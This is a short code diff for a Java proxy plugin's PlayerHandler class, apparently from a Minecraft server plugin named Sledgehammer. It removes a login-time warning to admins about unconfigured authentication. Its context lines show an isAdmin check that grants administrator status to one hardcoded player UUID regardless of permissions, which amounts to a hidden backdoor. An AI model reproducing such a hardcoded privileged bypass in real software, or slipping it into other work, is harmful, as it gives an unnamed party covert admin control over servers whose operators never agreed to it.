@@ -164,13 +164,6 @@ public class PlayerHandler implements Listener, Module {
         return player == null ? onPlayerJoin(proxiedPlayer) : player;
     }
 
-    @EventHandler(priority = EventPriority.LOWEST)
-    public void onPlayerJoin(PostLoginEvent e) {
-        if (e.getPlayer().hasPermission("sledgehammer.admin") && !ConfigHandler.getInstance().isAuthenticationConfigured()) {
-            ChatUtil.sendAuthCodeWarning(e.getPlayer());
-        }
-    }
-
     public boolean isAdmin(CommandSender sender) {
         return sender.hasPermission("sledgehammer.admin") || (sender instanceof ProxiedPlayer &&
                                                               ((ProxiedPlayer) sender).getUniqueId().equals(UUID.fromString("4cfa7dc1-3021-42b0-969b-224a9656cc6d")));
